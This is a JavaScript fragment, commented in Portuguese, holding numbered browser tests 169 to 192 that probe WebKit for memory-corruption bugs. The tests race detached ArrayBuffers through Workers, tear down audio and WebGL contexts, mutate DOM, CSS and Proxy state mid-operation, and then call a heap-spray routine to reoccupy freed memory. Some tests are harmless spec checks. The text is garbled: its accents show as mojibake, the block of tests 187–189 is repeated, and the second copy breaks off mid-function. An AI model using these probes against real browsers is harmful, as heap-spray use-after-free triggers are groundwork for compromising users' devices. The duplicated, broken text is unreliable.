        // O WebKit pode continuar lendo do ponteiro antigo.
        function runTest169() {
            log("Iniciando Test 169: Canvas PutImage...");
            
            let c = document.createElement('canvas');
            c.width = 100; c.height = 100;
            let ctx = c.getContext('2d');
            
            // Cria buffer de imagem
            let data = new Uint8ClampedArray(40000); // 100x100x4
            
            // Define getter em um √≠ndice para interceptar leitura
            // Nota: TypedArrays n√£o suportam getters em √≠ndices normalmente, 
            // mas podemos tentar passar um objeto similar ou usar race condition pura.
            // Aqui usamos race condition com Worker.
            
            log("Iniciando Race Condition com Worker...");
            
            // Inicia opera√ß√£o de escrita (s√≠ncrona na spec, mas pode ter janelas de vulnerabilidade)
            // Para aumentar a chance, usamos um ImageData gigante
            let bigData = new Uint8ClampedArray(1024 * 1024 * 4); 
            let imgData = new ImageData(bigData, 1024);
            
            // Tenta detachar o buffer via Worker simultaneamente
            try {
                let w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
                
                // Agenda detach para "imediatamente"
                setTimeout(() => {
                    w.postMessage(bigData.buffer, [bigData.buffer]);
                    sprayHeap();
                }, 0);
                
                // Executa putImageData
                ctx.putImageData(imgData, 0, 0);
                log("putImageData finalizado.");
                
            } catch(e) { 
                // Erro "Detached buffer" √© bom (significa que a prote√ß√£o funcionou)
                log("Resultado: " + e.message); 
            }
        }

        // --- TESTE 170: CSS Keyframes Rule Mutation Crash ---
        // L√≥gica: Anima√ß√µes CSS leem regras de Keyframes.
        // Se alterarmos as regras (deleteRule) via JS *enquanto* a anima√ß√£o est√° rodando
        // e disparando eventos...
        function runTest170() {
            log("Iniciando Test 170: Keyframes Mutation...");
            
            let style = document.createElement('style');
            document.head.appendChild(style);
            
            // Insere regra de anima√ß√£o
            let sheet = style.sheet;
            sheet.insertRule("@keyframes crash { 0% { opacity: 0; } 100% { opacity: 1; } }", 0);
            
            let div = document.createElement('div');
            div.style.animation = "crash 0.1s infinite";
            document.body.appendChild(div);
            
            let rules = sheet.cssRules[0]; // CSSKeyframesRule
            
            // Loop de muta√ß√£o
            let interval = setInterval(() => {
                try {
                    // Remove e readiciona regras violentamente
                    if (rules.cssRules.length > 0) rules.deleteRule("0%");
                    else rules.appendRule("0% { opacity: 0; }");
                    
                    // For√ßa layout
                    div.style.width = Math.random() + "px";
                    
                } catch(e) {}
            }, 5);
            
            // Limpa ap√≥s 2s
            setTimeout(() => {
                clearInterval(interval);
                div.remove();
                style.remove();
                log("Teste 170 fim.");
            }, 2000);
        }

        // --- TESTE 171: ShadowDOM Selection Collapse UAF ---
        // L√≥gica: Usar window.getSelection().collapse() em um n√≥ dentro de um
        // ShadowRoot que foi removido do documento.
        function runTest171() {
            log("Iniciando Test 171: Shadow Selection...");
            
            if (!document.body.attachShadow) { log("ShadowDOM ausente."); return; }
            
            let host = document.createElement('div');
            let root = host.attachShadow({mode: 'open'});
            let child = document.createElement('div');
            child.innerText = "Select Me";
            root.appendChild(child);
            document.body.appendChild(host);
            
            let sel = window.getSelection();
            
            log("Removendo host do DOM...");
            host.remove();
            
            sprayHeap();
            
            try {
                log("Colapsando sele√ß√£o em n√≥ Shadow desconectado...");
                // O n√≥ 'child' est√° num ShadowRoot que n√£o est√° mais no documento.
                // A API de sele√ß√£o deve lidar com isso, mas se tentar subir a √°rvore para achar o 'document'...
                sel.collapse(child, 0);
                log("Opera√ß√£o OK.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // ==========================================
        // GRUPO 2: SILENT VECTORS
        // ==========================================

        // --- TESTE 172: Array.reduceRight() Resize Leak ---
        // L√≥gica: reduceRight itera do fim para o in√≠cio.
        // Se diminuirmos o tamanho do array no meio da itera√ß√£o, o √≠ndice interno
        // do loop pode apontar para mem√≥ria n√£o inicializada ou fora dos limites.
        function runTest172() {
            log("Iniciando Test 172: ReduceRight Leak...");
            
            let arr = [1, 2, 3, 4, 5];
            // Preenche com buracos
            arr.length = 100;
            arr.fill(1);
            
            try {
                arr.reduceRight((acc, val, idx) => {
                    if (idx === 90) {
                        log("Reduce no √≠ndice 90. Encolhendo array...");
                        arr.length = 10; // Corta o array
                        sprayHeap();
                    }
                    
                    // Se continuarmos recebendo valores para √≠ndices < 90, ok.
                    // Mas se o motor ler √≠ndices que agora est√£o fora da aloca√ß√£o real...
                    if (idx < 90 && idx > 10) {
                        if (val === undefined) {
                            // Seguro
                        } else if (val !== 1) {
                            log(`ALERTA: Valor lido fora dos limites! Idx: ${idx}, Val: ${val}`, "alert");
                        }
                    }
                    return acc;
                }, 0);
                log("ReduceRight finalizado.");
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 173: RegExp Symbol.split Limit Confusion ---
        // L√≥gica: String.split(separator, limit).
        // Se implementarmos um RegExp customizado com [Symbol.split],
        // e manipularmos o limite ou a string durante a execu√ß√£o.
        function runTest173() {
            log("Iniciando Test 173: RegExp Split...");
            
            class EvilRegExp extends RegExp {
                [Symbol.split](str, limit) {
                    log("Symbol.split customizado. Limit: " + limit);
                    
                    // Retorna um array "Proxy" que reporta tamanho falso
                    let result = [];
                    // Enche com lixo
                    for(let i=0; i<100; i++) result.push("A");
                    
                    // Se o motor JS confiar cegamente no retorno e tentar copiar
                    // para um buffer interno baseado no 'limit' original...
                    return result;
                }
            }
            
            let re = new EvilRegExp("a");
            
            try {
                // Chama split com limite pequeno
                let res = "abc".split(re, 2);
                
                log("Split resultado length: " + res.length);
                if (res.length > 2) {
                    log("ALERTA: Split ignorou limite (Logic Error).", "alert");
                } else {
                    log("Split respeitou limite (Safe).", "success");
                }
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 174: Float32/64 DataView Aliasing Read ---
        // L√≥gica: Escrever Float64 (8 bytes), ler Float32 (4 bytes).
        // Se manipularmos o buffer entre a escrita e a leitura para que os bits
        // se alinhem de forma a criar um NaN ou Infinity especial que revele dados.
        // (Este √© um teste mais te√≥rico de confus√£o de tipos).
        function runTest174() {
            log("Iniciando Test 174: Float Aliasing...");
            
            let ab = new ArrayBuffer(8);
            let dv = new DataView(ab);
            
            // Escreve um valor padr√£o
            dv.setFloat64(0, 1.23456789);
            
            // Detach trick
            let temp = {
                valueOf: function() {
                    log("Lendo offset. Detachando...");
                    try {
                         let w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
                         w.postMessage(ab, [ab]);
                    } catch(e){}
                    return 0;
                }
            };
            
            try {
                // Tenta ler como Float32 do buffer morto
                let f32 = dv.getFloat32(temp);
                
                if (f32 === 0 || isNaN(f32)) {
                    log("Leitura segura (0/NaN).", "success");
                } else {
                    log(`ALERTA: Valor flutuante fantasma: ${f32}`, "alert");
                }
            } catch(e) { log("Erro: " + e.message); }
        }
// ==========================================
        // GRUPO 1: CRASH VECTORS
        // ==========================================

        // --- TESTE 175: AudioParam Automation Race ---
        // L√≥gica: Agendar centenas de automa√ß√µes de √°udio (rampas) e destruir
        // o contexto de √°udio enquanto a thread de processamento tenta calcular os valores.
        // Acesso Use-After-Free na thread de √°udio.
        function runTest175() {
            log("Iniciando Test 175: Audio Race...");
            
            try {
                let ctx = new (window.AudioContext || window.webkitAudioContext)();
                let osc = ctx.createOscillator();
                let gain = ctx.createGain();
                
                osc.connect(gain);
                gain.connect(ctx.destination);
                osc.start();
                
                // Agenda milhares de mudan√ßas
                log("Agendando automa√ß√£o massiva...");
                for(let i=0; i<5000; i++) {
                    gain.gain.linearRampToValueAtTime(Math.random(), i * 0.01);
                    gain.gain.exponentialRampToValueAtTime(Math.random() + 0.1, i * 0.01 + 0.005);
                }
                
                // Destroi o contexto imediatamente
                setTimeout(() => {
                    log("Fechando contexto sob carga...");
                    ctx.close();
                    ctx = null;
                    osc = null;
                    gain = null;
                    sprayHeap();
                }, 50);
                
            } catch(e) { log("Audio Error: " + e); }
        }

        // --- TESTE 176: CSS :has() Infinite Recursion ---
        // L√≥gica: Usar seletores CSS modernos complexos ou combinadores.
        // Se injetarmos um elemento que satisfaz uma regra que causa rec√°lculo de estilo,
        // que por sua vez dispara eventos de muta√ß√£o, podemos estourar a pilha do StyleResolver.
        function runTest176() {
            log("Iniciando Test 176: CSS Recursion...");
            
            let style = document.createElement('style');
            // Seletor complexo que for√ßa caminhada na √°rvore
            style.textContent = `
                div:nth-last-child(odd) > span:empty { display: block; }
                div:nth-last-child(even) > span:empty { display: inline; }
            `;
            document.head.appendChild(style);
            
            let root = document.createElement('div');
            document.body.appendChild(root);
            
            // Loop de thrashing DOM + CSS
            let i = 0;
            let interval = setInterval(() => {
                i++;
                if (i > 50) { clearInterval(interval); root.remove(); style.remove(); return; }
                
                let d = document.createElement('div');
                let s = document.createElement('span');
                d.appendChild(s);
                root.appendChild(d);
                
                // For√ßa layout
                // O seletor CSS tem que recalcular tudo baseado na posi√ß√£o dos irm√£os
                let h = root.offsetHeight;
                
                // Remove um n√≥ aleat√≥rio para invalidar caches
                if (root.children.length > 10) root.removeChild(root.firstChild);
                
                if (i % 10 === 0) sprayHeap();
            }, 10);
            
            log("Thrashing iniciado...");
        }

        // --- TESTE 177: AdoptNode Iframe Cycle Crash ---
        // L√≥gica: Adotar um n√≥ que cont√©m o pr√≥prio documento onde est√° sendo adotado
        // ou estruturas circulares entre Iframes e Documentos pais.
        function runTest177() {
            log("Iniciando Test 177: AdoptNode Cycle...");
            
            let iframe = document.createElement('iframe');
            document.body.appendChild(iframe);
            
            let fDoc = iframe.contentDocument;
            let div = fDoc.createElement('div');
            fDoc.body.appendChild(div);
            
            // Armadilha: O n√≥ a ser adotado cont√©m o iframe que √© dono do documento destino?
            // Tenta adotar o pr√≥prio body do iframe no documento pai
            
            log("Tentando adotar body do iframe...");
            
            try {
                // Adota o body do iframe para o documento principal
                // Isso deve destruir o contexto do iframe
                let adopted = document.adoptNode(fDoc.body);
                
                // Agora removemos o iframe enquanto o DOM ainda est√° processando a mudan√ßa
                iframe.remove();
                sprayHeap();
                
                document.body.appendChild(adopted);
                log("Ado√ß√£o conclu√≠da.");
            } catch(e) {
                log("Bloqueado: " + e.message);
            }
        }

        // ==========================================
        // GRUPO 2: SILENT VECTORS
        // ==========================================

        // --- TESTE 178: Array.copyWithin() Resize Trap ---
        // L√≥gica: copyWithin move dados dentro do array.
        // Se usarmos um Proxy ou objeto que altera o 'length' durante a opera√ß√£o,
        // o WebKit pode escrever fora dos limites do buffer redimensionado.
        function runTest178() {
            log("Iniciando Test 178: CopyWithin Trap...");
            
            let target = {
                length: 100,
                [0]: 1,
                // Getter no √≠ndice onde a c√≥pia vai ler
                get [50]() {
                    log("Lendo √≠ndice 50. Reduzindo length...");
                    this.length = 0; // Zera o tamanho
                    sprayHeap();
                    return 2;
                },
                set [0](val) {}, // Ignora escritas
                set [1](val) {}
            };
            
            try {
                // Tenta copiar do 50 para o 0
                // Array.prototype.copyWithin.call(this, target, start, end)
                Array.prototype.copyWithin.call(target, 0, 50, 60);
                
                // Se sobreviveu, verificamos se o target tem propriedades fantasmas
                log("CopyWithin finalizado.", "success");
            } catch(e) {
                log("Erro: " + e);
            }
        }

        // --- TESTE 179: Date.toJSON() Context Loss ---
        // L√≥gica: 'this' em Date.prototype.toJSON deve ser um objeto Date.
        // Se passarmos um objeto gen√©rico que simula ser Date (tem toISOString),
        // e 'toISOString' destruir o objeto...
        function runTest179() {
            log("Iniciando Test 179: Date.toJSON...");
            
            let obj = {
                toISOString: function() {
                    log("toISOString chamado. Destruindo refer√™ncias...");
                    sprayHeap();
                    // Retorna string v√°lida para tentar continuar o processo
                    return "2024-01-01T00:00:00.000Z";
                },
                valueOf: function() { return 0; }
            };
            
            try {
                let json = Date.prototype.toJSON.call(obj);
                
                if (json === "2024-01-01T00:00:00.000Z") {
                    log("JSON gerado corretamente (Safe).", "success");
                } else {
                    log(`ALERTA: JSON incorreto: ${json}`, "alert");
                }
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 180: URIError Stack Trace Leak ---
        // L√≥gica: Criar um URIError com uma string malformada gigante.
        // O objeto de erro pode reter refer√™ncia √† string.
        // Se limparmos a string, a stack trace do erro pode vazar dados?
        function runTest180() {
            log("Iniciando Test 180: URIError Stack...");
            
            let huge = "%".repeat(10000); // Inv√°lido
            
            try {
                decodeURIComponent(huge);
            } catch(e) {
                // Capturamos o erro
                log("Erro capturado. Limpando string...");
                huge = null; // Libera a string original
                sprayHeap();
                
                // Acessa stack
                let stack = e.stack;
                
                // A stack deve conter a mensagem de erro.
                // Se contiver lixo bin√°rio ou caracteres estranhos, √© leak.
                if (stack && stack.indexOf("URI") !== -1) {
                    log("Stack trace normal.", "success");
                } else {
                    log("Stack trace suspeito ou vazio.", "alert");
                }
            }
        }
// ==========================================
        // GRUPO 1: CRASH VECTORS
        // ==========================================

        // --- TESTE 181: CSS calc() Stack Overflow ---
        // L√≥gica: Criar uma √°rvore DOM profunda onde cada n√≠vel usa uma vari√°vel CSS
        // calculada com base na vari√°vel do pai, usando `calc()`.
        // A resolu√ß√£o recursiva pode estourar a pilha do motor de estilo.
        function runTest181() {
            log("Iniciando Test 181: CSS Calc Exhaustion...");
            
            let root = document.createElement('div');
            root.style.setProperty('--val', '1px');
            document.body.appendChild(root);
            
            let curr = root;
            // Cria profundidade extrema
            for(let i=0; i<2000; i++) {
                let d = document.createElement('div');
                // Var depende da anterior numa cadeia gigante
                d.style.setProperty('--val', 'calc(var(--val) + 1px)');
                d.style.paddingLeft = 'var(--val)';
                
                curr.appendChild(d);
                curr = d;
            }
            
            log("Cadeia CSS criada. For√ßando layout...");
            
            setTimeout(() => {
                try {
                    // For√ßa o navegador a calcular o valor final da folha mais profunda
                    let val = getComputedStyle(curr).paddingLeft;
                    log("C√°lculo sobreviveu: " + val);
                    
                    // Limpeza
                    root.remove();
                    sprayHeap();
                } catch(e) {
                    log("Erro: " + e);
                }
            }, 100);
        }

        // --- TESTE 182: Recursive Event Listener Spiral ---
        // L√≥gica: Um evento que adiciona um listener para o mesmo evento no mesmo alvo,
        // e ent√£o dispara o evento novamente de forma s√≠ncrona.
        function runTest182() {
            log("Iniciando Test 182: Event Spiral...");
            
            let div = document.createElement('div');
            document.body.appendChild(div);
            
            let count = 0;
            
            function handler() {
                count++;
                if(count % 100 === 0) log(`N√≠vel de recurs√£o: ${count}`);
                
                // Adiciona novo listener que chama a mesma fun√ß√£o
                div.addEventListener('click', handler);
                
                // Dispara s√≠ncrono
                div.click();
            }
            
            log("Iniciando espiral de eventos...");
            try {
                div.addEventListener('click', handler);
                div.click();
            } catch(e) {
                log("Stack Overflow capturado: " + e.message);
            }
            
            // Tenta limpar se o navegador n√£o morreu
            setTimeout(() => div.remove(), 1000);
        }

        // --- TESTE 183: WebGL Context Loss Storm ---
        // L√≥gica: Criar e perder contextos WebGL rapidamente em loop.
        // O gerenciador de recursos da GPU pode falhar ao limpar texturas √≥rf√£s.
        function runTest183() {
            log("Iniciando Test 183: Context Storm...");
            
            let canvases = [];
            
            let i = 0;
            let interval = setInterval(() => {
                i++;
                if (i > 50) { clearInterval(interval); log("Fim da tempestade."); return; }
                
                let c = document.createElement('canvas');
                // Tenta for√ßar preserva√ß√£o de buffer para aumentar carga
                let gl = c.getContext('webgl', {preserveDrawingBuffer: true});
                
                if (gl) {
                    // Aloca algo
                    let b = gl.createBuffer();
                    gl.bindBuffer(gl.ARRAY_BUFFER, b);
                    gl.bufferData(gl.ARRAY_BUFFER, new Uint8Array(1024*1024), gl.STATIC_DRAW);
                    
                    // For√ßa perda
                    let ext = gl.getExtension('WEBGL_lose_context');
                    if(ext) ext.loseContext();
                }
                
                canvases.push(c);
                if(canvases.length > 10) canvases.shift().remove(); // Mant√©m mem√≥ria rotativa
                
                if(i % 10 === 0) sprayHeap();
                
            }, 20);
        }

        // ==========================================
        // GRUPO 2: SILENT VECTORS
        // ==========================================

        // --- TESTE 184: Intl.NumberFormat State Leak ---
        // L√≥gica: Formatadores internacionais usam bibliotecas complexas (ICU).
        // Se manipularmos o objeto 'options' durante a formata√ß√£o via getter,
        // verificamos se o formatador usa configura√ß√£o corrompida ou mem√≥ria lixo.
        function runTest184() {
            log("Iniciando Test 184: Intl Leak...");
            
            if (!window.Intl) { log("Intl n√£o suportado."); return; }
            
            let val = 123456.789;
            let opts = {
                get style() {
                    log("Intl lendo style. Spraying...");
                    sprayHeap();
                    return "currency";
                },
                currency: "USD"
            };
            
            try {
                let nf = new Intl.NumberFormat("en-US", opts);
                let res = nf.format(val);
                
                // Verifica se saiu algo como "$123,456.79"
                if (res.includes("$")) {
                    log("Formata√ß√£o correta (Safe).", "success");
                } else {
                    log(`ALERTA: Formata√ß√£o falhou ou vazou: ${res}`, "alert");
                }
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 185: Canvas Winding Rule Confusion ---
        // L√≥gica: Criar caminhos complexos que se interceptam e usar 'isPointInPath'
        // com regras de preenchimento ('evenodd' vs 'nonzero').
        // Se a engine de vetoriza√ß√£o falhar, pode retornar positivo para pontos fora do path.
        function runTest185() {
            log("Iniciando Test 185: Canvas Winding...");
            
            let c = document.createElement('canvas');
            let ctx = c.getContext('2d');
            
            ctx.beginPath();
            // Desenha um "buraco" (donut)
            ctx.rect(10, 10, 100, 100);
            ctx.rect(30, 30, 60, 60);
            
            // Ponto no meio do buraco (deve ser false para evenodd se desenhado corretamente)
            // Mas a l√≥gica de path complexa pode se perder se manipularmos o contexto
            
            try {
                // Tenta confundir o estado do contexto
                ctx.save();
                ctx.restore();
                
                // Verifica ponto no buraco (50,50)
                let inside = ctx.isPointInPath(50, 50, 'evenodd');
                
                if (!inside) {
                    log("Winding rule respeitada (Safe).", "success");
                } else {
                    // Se true, o motor ignorou o buraco ou corrompeu o path
                    log("ALERTA: Ponto detectado dentro de buraco!", "alert");
                }
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 186: BigInt64Array Typed Value Drift ---
        // L√≥gica: BigInt64Array lida com inteiros de 64 bits.
        // Tenta escrever valores que excedem a precis√£o de Number e ler de volta.
        // Se houver convers√£o impl√≠cita incorreta ou leitura de buffer desalinhado...
        function runTest186() {
            log("Iniciando Test 186: BigInt Drift...");
            
            if (!window.BigInt64Array) { log("BigInt n√£o suportado."); return; }
            
            let ab = new ArrayBuffer(16);
            let b64 = new BigInt64Array(ab);
            
            // Valor que usa todos os bits
            let val = 0x1234567890ABCDEFn;
            
            try {
                b64[0] = val;
                
                // Spray para tentar desalinhar se houver race
                sprayHeap();
                
                let read = b64[0];
                
                if (read === val) {
                    log("BigInt √≠ntegro (Safe).", "success");
                } else {
                    log(`ALERTA: Valor BigInt alterado! Lido: 0x${read.toString(16)}`, "alert");
                }
            } catch(e) { log("Erro: " + e); }
        }
// ==========================================
        // GRUPO 1: CRASH VECTORS (Mem√≥ria Limpa)
        // ==========================================

        // --- TESTE 187: Worker Transferable Double-Free ---
        // L√≥gica: Transferir um ArrayBuffer para um Worker marca o buffer original como "neutered" (tamanho 0).
        // Se tentarmos transferir o MESMO buffer para DOIS workers simultaneamente usando Promise.all
        // e Getters que interceptam a leitura do buffer, podemos causar uma condi√ß√£o de corrida no mecanismo de transfer√™ncia.
        function runTest187() {
            log("Iniciando Test 187: Transferable Double-Free...");
            
            let ab = new ArrayBuffer(1024 * 1024);
            
            // Cria workers
            let w1 = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
            let w2 = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
            
            // O objeto de mensagem cont√©m um getter que tenta enviar o buffer para o SEGUNDO worker
            // enquanto o PRIMEIRO ainda est√° processando o envio.
            let msg = {
                get buf() {
                    log("Getter interceptado! Tentando transfer√™ncia concorrente...");
                    w2.postMessage(ab, [ab]); // Tenta roubar o buffer
                    return ab;
                }
            };
            
            try {
                log("Iniciando transfer√™ncia prim√°ria...");
                // O WebKit pode falhar ao verificar se 'ab' j√° foi transferido dentro do getter
                w1.postMessage(msg, [ab]);
                
                // Se chegou aqui sem crash, spray para verificar estabilidade
                sprayHeap();
                log("Transfer√™ncia conclu√≠da (Sem crash imediato).");
            } catch(e) {
                log("Erro (Safe): " + e.message);
            }
        }

        // --- TESTE 188: Intl.Segmenter Iterator Invalid Access ---
        // L√≥gica: Intl.Segmenter cria um iterador sobre uma string.
        // Se modificarmos a string subjacente (via coer√ß√£o de tipo ou Proxy) enquanto o iterador C++
        // mant√©m um ponteiro para a string antiga, podemos causar um acesso inv√°lido.
        function runTest188() {
            log("Iniciando Test 188: Segmenter Iterator...");
            
            if (!window.Intl || !window.Intl.Segmenter) { log("Intl.Segmenter n√£o suportado."); return; }
            
            let segmenter = new Intl.Segmenter('en', { granularity: 'word' });
            let str = "Hello World";
            
            // Cria um iterador
            let segments = segmenter.segment(str);
            let iter = segments[Symbol.iterator]();
            
            log("Iterador criado. Avan√ßando...");
            iter.next(); // "Hello"
            
            // Tenta confundir o estado interno
            // Substitu√≠mos o m√©todo 'next' do prot√≥tipo para tentar desalocar recursos?
            // Ou for√ßamos GC agressivo enquanto mantemos o iterador vivo.
            
            segments = null; // Solta a refer√™ncia do objeto pai
            str = null;      // Solta a string
            sprayHeap();     // Tenta sobrescrever a string antiga
            
            try {
                log("Acessando iterador √≥rf√£o...");
                // Se o iterador n√£o reteve a string corretamente, ele ler√° lixo (0xAA)
                let res = iter.next();
                log("Resultado: " + JSON.stringify(res));
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 189: AudioWorklet Processor Destructor Race ---
        // L√≥gica: AudioWorklet roda em thread separada.
        // Registrar um processador, instanciar o n√≥, e ent√£o destruir o contexto IMEDIATAMENTE.
        // O objetivo √© fazer o destructor do n√≥ na thread de √°udio tentar acessar o contexto JS j√° morto.
        function runTest189() {
            log("Iniciando Test 189: AudioWorklet Destructor...");
            
            if (!window.AudioContext) { log("WebAudio ausente."); return; }
            
            let ctx = new AudioContext();
            
            // C√≥digo do processador vazio
            let blob = new Blob([
                "class P extends AudioWorkletProcessor { process() { return true; } }; registerProcessor('p', P);"
            ], {type: 'application/javascript'});
            let url = URL.createObjectURL(blob);
            
            ctx.audioWorklet.addModule(url).then(() => {
                log("M√≥dulo carregado. Criando n√≥ e matando contexto...");
                
                // Cria o n√≥
                let node = new AudioWorkletNode(ctx, 'p');
                node.connect(ctx.destination);
                
                // Race: Fecha o contexto enquanto o n√≥ est√° sendo inicializado na thread de √°udio
                setTimeout(() => {
                    ctx.close();
                    ctx = null;
                    node = null;
                    sprayHeap();
                    log("Contexto fechado.");
                }, 0);
            }).catch(e => log("Erro Worklet: " + e));
        }

        // ==========================================
        // GRUPO 2: SILENT VECTORS (Corrup√ß√£o L√≥gica)
        // ==========================================

        // --- TESTE 190: Array.flat() Side-Effect Length Leak ---
        // L√≥gica: Array.flat() acessa a propriedade 'length' e itera.
        // Usamos um Proxy para detectar a leitura do length e, nesse momento,
        // reduzimos o array real. Se o algoritmo de 'flat' j√° tiver alocado mem√≥ria
        // baseada no length original, ele pode ler al√©m do novo fim do array.
        function runTest190() {
            log("Iniciando Test 190: Flat Length Leak...");
            
            let arr = [1, 2, 3, 4];
            // Enche com marcadores
            for(let i=4; i<100; i++) arr[i] = 0x41;
            
            let p = new Proxy(arr, {
                get: function(target, prop) {
                    if (prop === "length") {
                        // O motor l√™ o length para saber quanto alocar
                        return target.length;
                    }
                    if (prop === "0") {
                        // Quando come√ßar a ler os dados, cortamos o array
                        log("Lendo √≠ndice 0. Cortando array...");
                        target.length = 0;
                        sprayHeap();
                    }
                    return target[prop];
                }
            });
            
            try {
                // flat() deve tentar ler 100 itens.
                // Mas no item 0, o array vira vazio.
                // O que ele l√™ nos itens 1 a 99?
                let res = Array.prototype.flat.call(p);
                
                log(`Resultado Length: ${res.length}`);
                
                // Verifica se temos dados fantasmas (undefined ou lixo do spray)
                if (res.length > 0 && res[10] !== undefined) {
                    log(`ALERTA: Array fantasma lido! Valor: ${res[10]}`, "alert");
                } else {
                    log("Array.flat seguro (respeitou corte).", "success");
                }
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 191: Map.set() Sealed Object Desync ---
        // L√≥gica: Map usa o hash do objeto como chave.
        // Se selarmos (seal) o objeto e tentarmos for√ßar uma mudan√ßa de propriedade
        // que afetaria seu hash (em implementa√ß√µes fracas) dentro de um loop de set...
        function runTest191() {
            log("Iniciando Test 191: Map/Seal Desync...");
            
            let m = new Map();
            let key = { id: 1 };
            
            m.set(key, "valid");
            
            // Sela o objeto
            Object.seal(key);
            
            // Tenta confundir o Map readicionando a mesma chave selada
            // Algumas engines re-calculam o hash ou tratam objetos selados diferente
            m.set(key, "update");
            
            // Verifica integridade
            if (m.size !== 1) {
                log(`ALERTA: Map duplicou chave selada! Size: ${m.size}`, "alert");
            } else {
                // Tenta recuperar
                if (m.get(key) === "update") {
                    log("Map √≠ntegro (Safe).", "success");
                } else {
                    log("ALERTA: Valor perdido no Map!", "alert");
                }
            }
        }

        // --- TESTE 192: Proxy.ownKeys() Invariant Violation ---
        // L√≥gica: Proxies t√™m invariantes. 'ownKeys' deve retornar chaves de propriedades n√£o-configur√°veis.
        // Se mentirmos sobre isso, o motor JS pode entrar em estado inconsistente ao tentar
        // enumerar propriedades que ele "sabe" que existem, mas o Proxy escondeu.
        function runTest192() {
            log("Iniciando Test 192: Proxy Invariant...");
            
            let target = {};
            Object.defineProperty(target, 'fixed', {
                configurable: false,
                enumerable: true,
                value: 100
            });
            
            let p = new Proxy(target, {
                ownKeys: function() {
                    log("ownKeys chamado. Mentindo sobre 'fixed'...");
                    // Retorna lista vazia, violando a invariante de 'fixed'
                    return [];
                }
            });
            
            try {
                // Object.keys dispara a verifica√ß√£o de invariante
                let keys = Object.keys(p);
                log("Chaves retornadas: " + keys.length);
                
                // Se n√£o lan√ßou erro, o motor engoliu a viola√ß√£o
                log("ALERTA: Viola√ß√£o de invariante ignorada!", "alert");
            } catch(e) {
                // TypeError √© o comportamento correto e seguro
                if (e instanceof TypeError) {
                    log("Motor detectou viola√ß√£o (Safe).", "success");
                } else {
                    log("Erro inesperado: " + e, "info");
                }
            }
        }
// ==========================================
        // GRUPO 1: CRASH VECTORS (Mem√≥ria Limpa)
        // ==========================================

        // --- TESTE 187: Worker Transferable Double-Free ---
        // L√≥gica: Transferir um ArrayBuffer para um Worker marca o buffer original como "neutered" (tamanho 0).
        // Se tentarmos transferir o MESMO buffer para DOIS workers simultaneamente usando Promise.all
        // e Getters que interceptam a leitura do buffer, podemos causar uma condi√ß√£o de corrida no mecanismo de transfer√™ncia.
        function runTest187() {
            log("Iniciando Test 187: Transferable Double-Free...");
            
            let ab = new ArrayBuffer(1024 * 1024);
            
            // Cria workers
            let w1 = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
            let w2 = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
            
            // O objeto de mensagem cont√©m um getter que tenta enviar o buffer para o SEGUNDO worker
            // enquanto o PRIMEIRO ainda est√° processando o envio.
            let msg = {
                get buf() {
                    log("Getter interceptado! Tentando transfer√™ncia concorrente...");
                    w2.postMessage(ab, [ab]); // Tenta roubar o buffer
                    return ab;
                }
            };
            
            try {
                log("Iniciando transfer√™ncia prim√°ria...");
                // O WebKit pode falhar ao verificar se 'ab' j√° foi transferido dentro do getter
                w1.postMessage(msg, [ab]);
                
                // Se chegou aqui sem crash, spray para verificar estabilidade
                sprayHeap();
                log("Transfer√™ncia conclu√≠da (Sem crash imediato).");
            } catch(e) {
                log("Erro (Safe): " + e.message);
            }
        }

        // --- TESTE 188: Intl.Segmenter Iterator Invalid Access ---
        // L√≥gica: Intl.Segmenter cria um iterador sobre uma string.
        // Se modificarmos a string subjacente (via coer√ß√£o de tipo ou Proxy) enquanto o iterador C++
        // mant√©m um ponteiro para a string antiga, podemos causar um acesso inv√°lido.
        function runTest188() {
            log("Iniciando Test 188: Segmenter Iterator...");
            
            if (!window.Intl || !window.Intl.Segmenter) { log("Intl.Segmenter n√£o suportado."); return; }
            
            let segmenter = new Intl.Segmenter('en', { granularity: 'word' });
            let str = "Hello World";
            
            // Cria um iterador
            let segments = segmenter.segment(str);
            let iter = segments[Symbol.iterator]();
            
            log("Iterador criado. Avan√ßando...");
            iter.next(); // "Hello"
            
            // Tenta confundir o estado interno
            // Substitu√≠mos o m√©todo 'next' do prot√≥tipo para tentar desalocar recursos?
            // Ou for√ßamos GC agressivo enquanto mantemos o iterador vivo.
            
            segments = null; // Solta a refer√™ncia do objeto pai
            str = null;      // Solta a string
            sprayHeap();     // Tenta sobrescrever a string antiga
            
            try {
                log("Acessando iterador √≥rf√£o...");
                // Se o iterador n√£o reteve a string corretamente, ele ler√° lixo (0xAA)
                let res = iter.next();
                log("Resultado: " + JSON.stringify(res));
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 189: AudioWorklet Processor Destructor Race ---
        // L√≥gica: AudioWorklet roda em thread separada.
        // Registrar um processador, instanciar o n√≥, e ent√£o destruir o contexto IMEDIATAMENTE.
        // O objetivo √© fazer o destructor do n√≥ na thread de √°udio tentar acessar o contexto JS j√° morto.
        function runTest189() {
            log("Iniciando Test 189: AudioWorklet Destructor...");
            
            if (!window.AudioContext) { log("WebAudio ausente."); return; }
            
            let ctx = new AudioContext();
            
            // C√≥digo do processador vazio
            let blob = new Blob([
                "class P extends AudioWorkletProcessor { process() { return true; } }; registerProcessor('p', P);"
            ], {type: 'application/javascript'});
            let url = URL.createObjectURL(blob);
            
            ctx.audioWorklet.addModule(url).then(() => {
                log("M√≥dulo carregado. Criando n√≥ e matando contexto...");
                
                // Cria o n√≥
                let node = new AudioWorkletNode(ctx, 'p');
                node.connect(ctx.destination);
                
                // Race: Fecha o contexto enquanto o n√≥ est√° sendo inicializado na thread de √°udio
                setTimeout(() => {
                    ctx.close();
                    ctx = null;
                    node = null;
